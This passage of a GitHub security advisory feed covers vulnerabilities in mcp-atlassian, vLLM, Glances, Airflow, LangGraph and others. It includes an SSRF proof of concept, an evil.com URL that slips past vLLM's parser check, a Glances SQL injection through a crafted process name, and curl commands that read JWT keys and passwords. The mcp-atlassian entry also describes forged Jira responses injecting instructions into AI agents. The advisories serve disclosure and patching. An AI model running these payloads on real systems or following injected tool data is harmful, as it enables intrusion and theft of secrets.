}, headers={
    "X-Atlassian-Jira-Url": ATTACK,
    "X-Atlassian-Jira-Personal-Token": "any-value",
    # No Authorization header — this is the key condition
})
sid = r.headers.get("mcp-session-id")

# Call any Jira tool — this triggers get_jira_fetcher() and the outbound SSRF call
httpx.post(MCP, json={
    "jsonrpc": "2.0", "method": "tools/call",
    "params": {"name": "jira_get_issue", "arguments": {"issue_key": "PROJ-1"}},
    "id": 2
}, headers={
    "X-Atlassian-Jira-Url": ATTACK,
    "X-Atlassian-Jira-Personal-Token": "any-value",
    "Mcp-Session-Id": sid,
})

The listener will receive GET /rest/api/2/myself originating from the MCP server process, confirming the SSRF.


### Impact
This vulnerability affects any deployment using `--transport streamable-http` or `--transport sse`. The default HOST=0.0.0.0 binding exposes the HTTP endpoint to any host on the same network without any configuration change, and to the internet when deployed on a cloud instance.

- Any HTTP deployment: The server acts as an SSRF proxy, enabling reconnaissance of internal services (databases, internal APIs, microservices)
not directly reachable from outside the network.
- AI agent sessions: Once the attacker-controlled fetcher is cached in request.state, all Jira tool responses for that session originate from the attacker's server. The attacker can return crafted API responses containing LLM instructions, injecting those instructions into the AI agent's context as if they were legitimate Jira data - a prompt injection channel at the data layer requiring no tool parameter manipulation.
- Cloud deployments: Any network-reachable attacker can potentially steal the server's IAM role credentials via the instance metadata service, gaining full access to all cloud resources that role permits.
### References

- &lt;https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-7r34-79r5-rcc9&gt;
- &lt;https://github.com/sooperset/mcp-atlassian/commit/5cd697dfce9116ef330b8dc7a91291640e0528d9&gt;
- &lt;https://github.com/advisories/GHSA-7r34-79r5-rcc9&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r34-79r5-rcc9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-10T18:48:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asyncmy] asyncmy is vulnerable to SQL injection via crafted dict keys]]></title>
        <id>https://github.com/advisories/GHSA-qhqw-rrw9-25rm</id>
        <link href="https://github.com/advisories/GHSA-qhqw-rrw9-25rm"/>
        <updated>2026-03-10T17:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>SQL injection vulnerability in long2ice asyncmy thru 0.2.10 allows attackers to execute arbitrary SQL commands via crafted dict keys.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-65896">https://nvd.nist.gov/vuln/detail/CVE-2025-65896</a></li>
<li><a href="https://github.com/long2ice/asyncmy/issues/134">https://github.com/long2ice/asyncmy/issues/134</a></li>
<li><a href="https://github.com/long2ice/asyncmy">https://github.com/long2ice/asyncmy</a></li>
<li><a href="https://github.com/advisories/GHSA-qhqw-rrw9-25rm">https://github.com/advisories/GHSA-qhqw-rrw9-25rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qhqw-rrw9-25rm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-12-02T21:31:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-amazon] Apache Airflow AWS Auth Manager has Host Header Injection Leading to SAML Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-rv5f-ccpm-xjj4</id>
        <link href="https://github.com/advisories/GHSA-rv5f-ccpm-xjj4"/>
        <updated>2026-03-10T01:22:22.000Z</updated>
        <content type="html"><![CDATA[<p>In AWS Auth manager, the origin of the SAML authentication has been used as provided by the client and not verified against the actual instance URL.&nbsp;
This allowed to gain access to different instances with potentially different access controls by reusing SAML response from other instances.</p>
<p>You should upgrade to 9.22.0 version of provider if you use AWS Auth Manager.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25604">https://nvd.nist.gov/vuln/detail/CVE-2026-25604</a></li>
<li><a href="https://github.com/apache/airflow/pull/61368">https://github.com/apache/airflow/pull/61368</a></li>
<li><a href="https://lists.apache.org/thread/spwwrsmwxod7fpttcd7n7zs46j839l77">https://lists.apache.org/thread/spwwrsmwxod7fpttcd7n7zs46j839l77</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/09/6">http://www.openwall.com/lists/oss-security/2026/03/09/6</a></li>
<li><a href="https://github.com/apache/airflow/commit/1a86aec01d827ba8caf41b645db56663a9a61850">https://github.com/apache/airflow/commit/1a86aec01d827ba8caf41b645db56663a9a61850</a></li>
<li><a href="https://github.com/advisories/GHSA-rv5f-ccpm-xjj4">https://github.com/advisories/GHSA-rv5f-ccpm-xjj4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv5f-ccpm-xjj4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-09T12:31:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-http] Apache Airflow Providers Http has Unsafe Pickle Deserializatio leading to RCE via HttpOperator]]></title>
        <id>https://github.com/advisories/GHSA-9r5j-7r2x-rv4g</id>
        <link href="https://github.com/advisories/GHSA-9r5j-7r2x-rv4g"/>
        <updated>2026-03-10T01:21:25.000Z</updated>
        <content type="html"><![CDATA[<p>A user with access to the DB could craft a database entry that would result in executing code on Triggerer - which gives anyone who have access to DB the same permissions as Dag Author. Since direct DB access is not usual and recommended for Airflow, the likelihood of it making any damage is low.</p>
<p>Users should upgrade to version 6.0.0 of the provider to avoid even that risk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-69219">https://nvd.nist.gov/vuln/detail/CVE-2025-69219</a></li>
<li><a href="https://github.com/apache/airflow/pull/61662">https://github.com/apache/airflow/pull/61662</a></li>
<li><a href="https://lists.apache.org/thread/zjkfb2njklro68tqzym092r4w65m5dq0">https://lists.apache.org/thread/zjkfb2njklro68tqzym092r4w65m5dq0</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/03/09/1">http://www.openwall.com/lists/oss-security/2026/03/09/1</a></li>
<li><a href="https://github.com/apache/airflow/commit/97839f7b0a8ae66d6079bb7fad5a363068f61617">https://github.com/apache/airflow/commit/97839f7b0a8ae66d6079bb7fad5a363068f61617</a></li>
<li><a href="https://github.com/advisories/GHSA-9r5j-7r2x-rv4g">https://github.com/advisories/GHSA-9r5j-7r2x-rv4g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r5j-7r2x-rv4g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-09T12:31:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[copyparty] copyparty: volflag `nohtml` did not block javascript in svg files]]></title>
        <id>https://github.com/advisories/GHSA-m6hv-x64c-27mm</id>
        <link href="https://github.com/advisories/GHSA-m6hv-x64c-27mm"/>
        <updated>2026-03-10T18:45:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>nohtml</code> config option, intended to prevent execution of JavaScript in user-uploaded HTML files, did not apply to SVG images.</p>
<h3 id="details">Details</h3>
<p>A user with write-permission could upload an SVG containing embedded JavaScript, which would execute in the context of whichever user opens it.</p>
<p>This in itself is not a vulnerability; it is intended behavior according to <a href="https://www.w3.org/TR/SVG11/script.html">the SVG spec</a>. The vulnerability is that the <code>nohtml</code> volflag, when enabled, did not prevent this.</p>
<p><code>nohtml</code>, intended for use on volumes which contains untrusted files, would correctly prevent execution of javascript in HTML files, but did not consider SVG images. This has been fixed in v1.20.11.</p>
<h3 id="impact">Impact</h3>
<p>The malicious JavaScript could move or delete existing files on the server, or upload new files, using the account of the person who opens the SVG.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/9001/copyparty/security/advisories/GHSA-m6hv-x64c-27mm">https://github.com/9001/copyparty/security/advisories/GHSA-m6hv-x64c-27mm</a></li>
<li><a href="https://github.com/9001/copyparty/commit/1c9f894e149b6be3cc7de81efc93a4ce4766e0e5">https://github.com/9001/copyparty/commit/1c9f894e149b6be3cc7de81efc93a4ce4766e0e5</a></li>
<li><a href="https://github.com/9001/copyparty/releases/tag/v1.20.11">https://github.com/9001/copyparty/releases/tag/v1.20.11</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30974">https://nvd.nist.gov/vuln/detail/CVE-2026-30974</a></li>
<li><a href="https://github.com/advisories/GHSA-m6hv-x64c-27mm">https://github.com/advisories/GHSA-m6hv-x64c-27mm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6hv-x64c-27mm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-10T01:20:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM has SSRF Protection Bypass]]></title>
        <id>https://github.com/advisories/GHSA-v359-jj2v-j536</id>
        <link href="https://github.com/advisories/GHSA-v359-jj2v-j536"/>
        <updated>2026-03-10T18:39:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The SSRF protection fix for <a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-qh4c-xf7m-gxfc">https://github.com/vllm-project/vllm/security/advisories/GHSA-qh4c-xf7m-gxfc</a> can be bypassed in the <code>load_from_url_async</code> method due to inconsistent URL parsing behavior between the validation layer and the actual HTTP client.</p>
<h2 id="affected-component">Affected Component</h2>
<ul>
<li><strong>File</strong>: <code>vllm/connections.py</code></li>
<li><strong>Function</strong>: <code>load_from_url_async</code></li>
</ul>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p>The SSRF <a href="https://github.com/vllm-project/vllm/pull/32746">fix</a> uses <code>urllib3.util.parse_url()</code> to validate and extract the hostname from user-provided URLs. However, <code>load_from_url_async</code> uses <code>aiohttp</code> for making the actual HTTP requests, and <code>aiohttp</code> internally uses the <code>yarl</code> library for URL parsing.</p>
<p>These two URL parsers handle backslash characters (<code>\</code>) differently:</p>
<table>
<thead>
<tr>
<th>Parser</th>
<th>Input URL</th>
<th>Parsed Host</th>
<th>Parsed Path</th>
<th>Behavior</th>
</tr>
</thead>
<tbody><tr>
<td><code>urllib3.parse_url()</code></td>
<td><code>https://httpbin.org\@evil.com/</code></td>
<td><code>httpbin.org</code></td>
<td><code>/%5C@evil.com/</code></td>
<td>URL-encodes <code>\</code> as <code>%5C</code>, treats <code>\@evil.com/</code> as part of the path</td>
</tr>
<tr>
<td><code>yarl</code> (via aiohttp)</td>
<td><code>https://httpbin.org\@evil.com/</code></td>
<td><code>evil.com</code></td>
<td><code>/</code></td>
<td>Treats <code>\</code> as part of userinfo (<code>user: httpbin.org\</code>), the <code>@</code> acts as the userinfo/host separator</td>
</tr>
</tbody></table>
<h3 id="attack-scenario">Attack Scenario</h3>
<pre><code class="language-python"># Attacker provides this URL
malicious_url = "https://httpbin.org\\@evil.com/"

# 1. Validation layer (urllib3.parse_url)
parsed = urllib3.util.parse_url(malicious_url)
# parsed.host == "httpbin.org"  ✅ Passes validation

# 2. Actual request (aiohttp with yarl)
async with aiohttp.ClientSession() as session:
    async with session.get(malicious_url) as response:
        # Request actually goes to evil.com!  ❌ Bypass!
</code></pre>
<h3 id="why-this-happens">Why This Happens</h3>
<ol>
<li><strong>yarl</strong>: Interprets <code>httpbin.org\</code> as the userinfo component, and <code>@</code> as the userinfo/host separator, so the URL is parsed as <code>user=httpbin.org\</code>, <code>host=evil.com</code>, <code>path=/</code></li>
<li><strong>urllib3</strong>: URL-encodes the backslash as <code>%5C</code>, so <code>\@evil.com/</code> becomes <code>/%5C@evil.com/</code> which is treated as part of the path, leaving <code>host=httpbin.org</code></li>
</ol>
<p>This inconsistency allows an attacker to:</p>
<ul>
<li>Bypass the hostname allowlist check</li>
<li>Access arbitrary internal/external services</li>
<li>Perform full SSRF attacks</li>
</ul>
<h2 id="fixes">Fixes</h2>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/34743">https://github.com/vllm-project/vllm/pull/34743</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-qh4c-xf7m-gxfc">https://github.com/vllm-project/vllm/security/advisories/GHSA-qh4c-xf7m-gxfc</a></li>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-v359-jj2v-j536">https://github.com/vllm-project/vllm/security/advisories/GHSA-v359-jj2v-j536</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/34743">https://github.com/vllm-project/vllm/pull/34743</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/6f3b2047abd4a748e3db4a68543f8221358002c0">https://github.com/vllm-project/vllm/commit/6f3b2047abd4a748e3db4a68543f8221358002c0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25960">https://nvd.nist.gov/vuln/detail/CVE-2026-25960</a></li>
<li><a href="https://github.com/advisories/GHSA-v359-jj2v-j536">https://github.com/advisories/GHSA-v359-jj2v-j536</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v359-jj2v-j536</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-09T19:55:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances has SQL Injection via Process Names in TimescaleDB Export]]></title>
        <id>https://github.com/advisories/GHSA-x46r-mf5g-xpr6</id>
        <link href="https://github.com/advisories/GHSA-x46r-mf5g-xpr6"/>
        <updated>2026-03-10T18:44:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The TimescaleDB export module constructs SQL queries using string concatenation with unsanitized system monitoring data. The normalize() method wraps string values in single quotes but does not escape embedded single quotes, making SQL injection trivial via attacker-controlled data such as process names, filesystem mount points, network interface names, or container names.</p>
<p>Root Cause: The normalize() function uses f"'{value}'" for string values without escaping single quotes within the value. The resulting strings are concatenated into INSERT queries via string formatting and executed directly with cur.execute() — no parameterized queries are used.</p>
<h4 id="affected-code">Affected Code</h4>
<ul>
<li><em>File: glances/exports/glances_timescaledb/<strong>init</strong>.py, lines 79-93 (normalize function)</em></li>
</ul>
<pre><code>def normalize(self, value):
    """Normalize the value to be exportable to TimescaleDB."""
    if value is None:
        return 'NULL'
    if isinstance(value, bool):
        return str(value).upper()
    if isinstance(value, (list, tuple)):
        # Special case for list of one boolean
        if len(value) == 1 and isinstance(value[0], bool):
            return str(value[0]).upper()
        return ', '.join([f"'{v}'" for v in value])
    if isinstance(value, str):
        return f"'{value}'"  # &lt;-- NO ESCAPING of single quotes within value

    return f"{value}"
</code></pre>
<ul>
<li><em>File: glances/exports/glances_timescaledb/<strong>init</strong>.py, lines 201-205 (query construction)</em></li>
</ul>
<pre><code># Insert the data
insert_list = [f"({','.join(i)})" for i in values_list]
insert_query = f"INSERT INTO {plugin} VALUES {','.join(insert_list)};"
logger.debug(f"Insert data into table: {insert_query}")
try:
    cur.execute(insert_query)  # &lt;-- Direct execution of concatenated SQL
</code></pre>
<h3 id="poc">PoC</h3>
<ul>
<li>As a normal user, create a process with the name containing the SQL Injection payload:</li>
</ul>
<pre><code>exec -a "x'); COPY (SELECT version()) TO '/tmp/sqli_proof.txt' --"   python3 -c 'import time; [sum(range(500000)) or time.sleep(0.01) for _ in iter(int, 1)]'
</code></pre>
<ul>
<li>Start Glances with TimescaleDB export as root user:</li>
</ul>
<pre><code>glances --export timescaledb --export-process-filter ".*" --time 5 --stdout cpu
</code></pre>
<ul>
<li>Observe that sqli_proof.txt is created in /tmp directory.</li>
</ul>
<h3 id="impact">Impact</h3>
<ul>
<li>Data Destruction: DROP TABLE, DELETE, TRUNCATE operations against the TimescaleDB database.</li>
<li>Data Exfiltration: Using COPY ... TO or subqueries to extract data from other tables.</li>
<li>Potential RCE: Via PostgreSQL extensions like COPY ... PROGRAM which executes OS commands.</li>
<li>Privilege Escalation: Any local user who can create a process with a crafted name can inject SQL into the database, potentially compromising the entire PostgreSQL instance.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-x46r-mf5g-xpr6">https://github.com/nicolargo/glances/security/advisories/GHSA-x46r-mf5g-xpr6</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/39161f0d6fd723d83f534b48f24cdca722573336">https://github.com/nicolargo/glances/commit/39161f0d6fd723d83f534b48f24cdca722573336</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.1">https://github.com/nicolargo/glances/releases/tag/v4.5.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30930">https://nvd.nist.gov/vuln/detail/CVE-2026-30930</a></li>
<li><a href="https://github.com/advisories/GHSA-x46r-mf5g-xpr6">https://github.com/advisories/GHSA-x46r-mf5g-xpr6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x46r-mf5g-xpr6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-09T19:51:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glances] Glances Exposes Unauthenticated Configuration Secrets]]></title>
        <id>https://github.com/advisories/GHSA-gh4x-f7cq-wwx6</id>
        <link href="https://github.com/advisories/GHSA-gh4x-f7cq-wwx6"/>
        <updated>2026-03-10T18:44:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The /api/4/config REST API endpoint returns the entire parsed Glances configuration file (glances.conf) via self.config.as_dict() with no filtering of sensitive values. The configuration file contains credentials for all configured backend services including database passwords, API tokens, JWT signing keys, and SSL key passwords.</p>
<h3 id="details">Details</h3>
<p>Root Cause: The as_dict() method in config.py iterates over every section and every key in the ConfigParser and returns them all as a flat dictionary. No sensitive key filtering or redaction is applied.</p>
<p>Affected Code:</p>
<ul>
<li><em>File: glances/outputs/glances_restful_api.py, lines 1154-1167</em></li>
</ul>
<pre><code>def _api_config(self):
    """Glances API RESTful implementation.

    Return the JSON representation of the Glances configuration file
    HTTP/200 if OK
    HTTP/404 if others error
    """
    try:
        # Get the RAW value of the config' dict
        args_json = self.config.as_dict()  # &lt;-- Returns ALL config including secrets
    except Exception as e:
        raise HTTPException(status.HTTP_404_NOT_FOUND, f"Cannot get config ({str(e)})")
    else:
        return GlancesJSONResponse(args_json)
</code></pre>
<ul>
<li><em>File: glances/config.py, lines 280-287</em></li>
</ul>
<pre><code>def as_dict(self):
    """Return the configuration as a dict"""
    dictionary = {}
    for section in self.parser.sections():
        dictionary[section] = {}
        for option in self.parser.options(section):
            dictionary[section][option] = self.parser.get(section, option)  # No filtering
    return dictionary
</code></pre>
<ul>
<li><em>File: glances/outputs/glances_restful_api.py, lines 472-475 (authentication bypass)</em></li>
</ul>
<pre><code>if self.args.password:
    router = APIRouter(prefix=self.url_prefix, dependencies=[Depends(self.authentication)])
else:
    router = APIRouter(prefix=self.url_prefix)  # No authentication!
</code></pre>
<h3 id="poc">PoC</h3>
<ul>
<li>Start Glances in default webserver mode:</li>
</ul>
<pre><code>glances -w
# Glances web server started on http://0.0.0.0:61208/
</code></pre>
<ul>
<li>From any network-reachable host, retrieve all configuration secrets:</li>
</ul>
<pre><code># Get entire config including all credentials
curl http://target:61208/api/4/config
</code></pre>
<p>Step 3: Extract specific secrets:</p>
<pre><code># Get JWT secret key for token forgery
curl http://target:61208/api/4/config/outputs/jwt_secret_key

# Get InfluxDB token
curl http://target:61208/api/4/config/influxdb2/token

# Get all stored server passwords
curl http://target:61208/api/4/config/passwords
</code></pre>
<h3 id="impact">Impact</h3>
<p>Full Infrastructure Compromise: Database credentials (InfluxDB, MongoDB, PostgreSQL/TimescaleDB, CouchDB, Cassandra) allow direct access to all connected backend data stores.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-gh4x-f7cq-wwx6">https://github.com/nicolargo/glances/security/advisories/GHSA-gh4x-f7cq-wwx6</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/306a7136154ba5c1531489c99f8306d84eae37da">https://github.com/nicolargo/glances/commit/306a7136154ba5c1531489c99f8306d84eae37da</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.1">https://github.com/nicolargo/glances/releases/tag/v4.5.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30928">https://nvd.nist.gov/vuln/detail/CVE-2026-30928</a></li>
<li><a href="https://github.com/advisories/GHSA-gh4x-f7cq-wwx6">https://github.com/advisories/GHSA-gh4x-f7cq-wwx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh4x-f7cq-wwx6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-09T19:50:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langgraph] LangGraph checkpoint loading has unsafe msgpack deserialization]]></title>
        <id>https://github.com/advisories/GHSA-g48c-2wqr-h844</id>
        <link href="https://github.com/advisories/GHSA-g48c-2wqr-h844"/>
        <updated>2026-03-09T13:19:59.000Z</updated>
        <content type="html"><![CDATA[<p>LangGraph checkpointers can load msgpack-encoded checkpoints that reconstruct Python objects during deserialization. If an attacker can modify checkpoint data in the backing store (for example, after a database compromise or other privileged write access to the persistence layer), they can potentially supply a crafted payload that triggers unsafe object reconstruction when the checkpoint is loaded.</p>
<p>This is a <strong>post-exploitation / defense-in-depth</strong> issue. Exploitation requires the ability to write attacker-controlled checkpoint bytes at rest. In most deployments that prerequisite already implies a serious incident; the additional risk is turning “checkpoint-store write access” into code execution in the application runtime, which can expand blast radius (for example by exposing environment variables or cloud credentials available to the runtime).</p>
<p>There is no evidence of exploitation in the wild, and LangGraph is not aware of a practical exploitation path in existing deployments today. This change is intended to reduce the blast radius of a checkpoint-store compromise.</p>
<h2 id="affected-users--systems">Affected users / systems</h2>
<p>Users may be affected if they:</p>
<ul>
<li>use a persistent checkpointer (database, remote store, shared filesystem, etc.),</li>
<li>load/resume from checkpoints, and</li>
<li>operate in an environment where an attacker could gain privileged write access to checkpoint data in the backing store.</li>
</ul>
<p>This issue requires the attacker to be able to modify persisted checkpoint bytes (or to compromise a trusted component that writes them). It is generally not reachable by an unauthenticated remote attacker in a correctly configured deployment.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Potential <strong>arbitrary code execution</strong> or other unsafe side effects during checkpoint deserialization.</li>
<li>Escalation from “write access to checkpoint store” to “code execution in the application runtime,” which may expose runtime secrets or provide access to other systems the runtime can reach.</li>
</ul>
<h2 id="exploitation-scenario-high-level">Exploitation scenario (high level)</h2>
<ol>
<li>Attacker gains privileged write access to the checkpoint store (for example, via database compromise, leaked credentials, or abuse of an administrative data path).</li>
<li>Attacker writes a crafted checkpoint payload containing msgpack data intended to reconstruct dangerous objects.</li>
<li>Application resumes and deserializes the checkpoint; unsafe reconstruction could execute attacker-controlled behavior.</li>
</ol>
<h2 id="mitigation--remediation">Mitigation / remediation</h2>
<p>LangGraph provides an allowlist-based hardening mechanism for msgpack checkpoint deserialization.</p>
<h3 id="strict-mode-environment-variable">Strict mode (environment variable)</h3>
<ul>
<li><strong><code>LANGGRAPH_STRICT_MSGPACK</code></strong><ul>
<li>When set truthy (<code>1</code>, <code>true</code>, <code>yes</code>), the default msgpack deserialization policy becomes strict.</li>
<li>Concretely: <code>JsonPlusSerializer()</code> will default <code>allowed_msgpack_modules</code> to <code>None</code> (strict) instead of <code>True</code> (warn-and-allow), unless <code>allowed_msgpack_modules=...</code> is explicitly passed.</li>
</ul>
</li>
</ul>
<h3 id="allowed_msgpack_modules-serializercheckpointer-config"><code>allowed_msgpack_modules</code> (serializer/checkpointer config)</h3>
<p>This setting controls what msgpack “ext” types are allowed to be reconstructed.</p>
<ul>
<li><code>True</code> (default when strict mode is not enabled): allow all ext types, but log a warning when deserializing a type that is not explicitly registered.</li>
<li><code>None</code> (strict): only a built-in safe set is reconstructed; other ext types are blocked.</li>
<li><code>[(module, class_name), ...]</code> (strict allowlist): the built-in safe set plus exactly the listed symbols are reconstructed (exact-match).</li>
</ul>
<h3 id="built-in-safe-set">Built-in safe set</h3>
<p>A small set of types is always treated as safe to reconstruct (for example <code>datetime</code> types, <code>uuid.UUID</code>, <code>decimal.Decimal</code>, <code>set</code>/<code>frozenset</code>/<code>deque</code>, <code>ipaddress</code> types, <code>pathlib</code> paths, <code>zoneinfo.ZoneInfo</code>, compiled regex patterns, and selected LangGraph internal types).</p>
<h3 id="automatically-derived-allowlist-only-when-compiling-graphs">Automatically derived allowlist (only when compiling graphs)</h3>
<p>When <code>LANGGRAPH_STRICT_MSGPACK</code> is enabled and <code>StateGraph</code> is compiled, LangGraph derives an allowlist from the graph’s schemas and channels and applies it to the checkpointer.</p>
<ul>
<li>The allowlist is built by walking the state/input/output/context schemas (plus node/branch input schemas) and channel value/update types. It includes Pydantic v1/v2 models, dataclasses, enums, TypedDict field types, and common typing constructs (containers, unions, <code>Annotated</code>).</li>
<li>LangGraph also includes a curated set of common LangChain message classes.</li>
</ul>
<p>This derived allowlist is only applied if the selected checkpointer supports <code>with_allowlist(...)</code>. If a user is constructing serializers/checkpointers manually (or using a checkpointer that does not support allowlist propagation), they will need to configure <code>allowed_msgpack_modules</code> themselves.</p>
<h3 id="operational-guidance">Operational guidance</h3>
<ul>
<li>Treat checkpoint stores as integrity-sensitive. Restrict write access and rotate credentials if compromise is suspected.</li>
<li>Enable strict mode (<code>LANGGRAPH_STRICT_MSGPACK=true</code>) in production if feasible, and rely on schema-driven allowlisting to reduce incompatibilities.</li>
<li>Avoid providing custom msgpack deserialization hooks that reconstruct arbitrary types unless checkpoint data is fully trusted.</li>
</ul>
<h2 id="limitations--important-notes">Limitations / important notes</h2>
<ul>
<li>If a checkpointer implementation does <strong>not</strong> support allowlist application (i.e., does not implement <code>with_allowlist</code>), allowlist enforcement may be skipped (with a warning). In that situation, strict expectations may not hold.</li>
<li>If an application supplies a custom msgpack unpack hook (<code>ext_hook</code>), the custom hook controls reconstruction and can bypass the default allowlist checks (intentional escape hatch, but it weakens the protection).</li>
</ul>
<h2 id="langsmith--hosted-deployments-note">LangSmith / hosted deployments note</h2>
<p>LangSmith is not aware of this issue presenting risk to existing LangSmith-hosted deployments. The described threat model requires an attacker to tamper with the checkpoint persistence layer used by the deployment; typical hosted configurations are designed to prevent such access.</p>
<p>First reported by:  yardenporat353</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langgraph/security/advisories/GHSA-g48c-2wqr-h844">https://github.com/langchain-ai/langgraph/security/advisories/GHSA-g48c-2wqr-h844</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28277">https://nvd.nist.gov/vuln/detail/CVE-2026-28277</a></li>
<li><a href="https://github.com/advisories/GHSA-g48c-2wqr-h844">https://github.com/advisories/GHSA-g48c-2wqr-h844</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g48c-2wqr-h844</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T20:19:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[x402] x402 SDK Security Advisory]]></title>
        <id>https://github.com/advisories/GHSA-qr2g-p6q7-w82m</id>
        <link href="https://github.com/advisories/GHSA-qr2g-p6q7-w82m"/>
        <updated>2026-03-07T02:37:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A security vulnerability exists in outdated versions of the x402 SDK.</p>
<p>This vulnerability does not affect users' private keys, smart contracts, or funds.</p>
<p>The issue impacts resource servers accepting payments on Solana when the facilitator is running a vulnerable version of the x402 SDK.</p>
<h3 id="who-should-take-action">Who Should Take Action</h3>
<p>Facilitators that process payments on Solana must upgrade the x402 SDK to the patched versions listed below.</p>
<p>Clients are not required to upgrade.</p>
<p>Resource servers are not required to upgrade unless they operate their own facilitator (self-facilitate).</p>
<h3 id="patches">Patches</h3>
<p>Please update to the following package versions:</p>
<ul>
<li>Npm: @x402/svm &gt;= 2.6.0</li>
<li>Pypi: x402 &gt;= 2.3.0</li>
<li>Go: x402 &gt;= 2.5.0</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/coinbase/x402/security/advisories/GHSA-qr2g-p6q7-w82m">https://github.com/coinbase/x402/security/advisories/GHSA-qr2g-p6q7-w82m</a></li>
<li><a href="https://github.com/advisories/GHSA-qr2g-p6q7-w82m">https://github.com/advisories/GHSA-qr2g-p6q7-w82m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qr2g-p6q7-w82m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-07T02:37:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-memory-service] mcp-memory-service's Wildcard CORS with Credentials Enables Cross-Origin Memory Theft]]></title>
        <id>https://github.com/advisories/GHSA-g9rg-8vq5-mpwm</id>
        <link href="https://github.com/advisories/GHSA-g9rg-8vq5-mpwm"/>
        <updated>2026-03-07T02:12:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
